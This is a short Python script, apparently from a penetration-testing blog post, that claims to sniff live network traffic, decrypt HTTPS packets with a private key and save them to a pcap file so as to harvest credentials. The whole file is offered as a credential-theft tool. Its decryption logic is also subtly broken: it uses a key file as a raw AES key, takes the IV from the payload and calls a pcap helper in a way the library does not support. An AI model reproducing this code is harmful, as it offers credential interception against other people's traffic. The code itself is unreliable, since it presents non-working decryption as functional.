# https://systemweakness.com/python-penetration-testing-capturing-and-filtering-web-application-packets-to-harvest-credentials-e737a87374db
# Capturing and filtering web application packets to harvest credentials

import pyshark
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Set the path to your private key file
key_path = '/path/to/your/private/key'

# Set the name of the pcap file to write the decrypted traffic to
pcap_file = 'decrypted_traffic.pcap'

# Define a function to decrypt the HTTPS traffic using the private key
def decrypt_traffic(packet):
    # Check if the packet contains HTTPS traffic
    if 'tls' in packet:
        # Get the TLS payload
        tls_payload = packet['tls'].payload

        # Decrypt the TLS payload using the private key
        key = open(key_path, 'rb').read()
        backend = default_backend()
        cipher = Cipher(algorithms.AES(key), modes.CBC(bytes.fromhex(tls_payload[:32])), backend=backend)
        decryptor = cipher.decryptor()
        decrypted_payload = decryptor.update(bytes.fromhex(tls_payload[32:])) + decryptor.finalize()

        # Update the packet with the decrypted payload
        packet['tls'].payload = decrypted_payload.hex()

# Set up the packet capture
capture = pyshark.LiveCapture(interface='eth0', display_filter='ssl')

# Open the pcap file for writing
with open(pcap_file, 'wb') as pcap:
    # Write the header for the pcap file
    pcap.write(pyshark.pcap.global_header())

    # Capture packets and decrypt HTTPS traffic
    for packet in capture.sniff_continuously():
        decrypt_traffic(packet)

        # Write the decrypted packet to the pcap file
        pcap.write(packet.packet_data)
